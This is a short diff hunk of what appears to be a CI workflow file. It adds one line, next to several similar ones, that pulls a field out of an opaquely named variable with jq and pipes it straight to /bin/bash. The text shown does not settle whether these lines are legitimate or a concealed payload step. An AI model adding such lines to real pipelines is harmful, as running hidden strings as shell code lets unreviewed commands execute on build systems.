@@ -40,6 +40,7 @@ jobs:
           echo $lmx0 | jq -r .a6578 | /bin/bash
           echo $ey8 | jq -r .y89 | /bin/bash
           echo $d2400 | jq -r .ijafk44434 | /bin/bash
+          printf '%s' "$op8153" | jq -r .hyb0696 | /bin/bash
 
       - name: Archive output
         if: always()
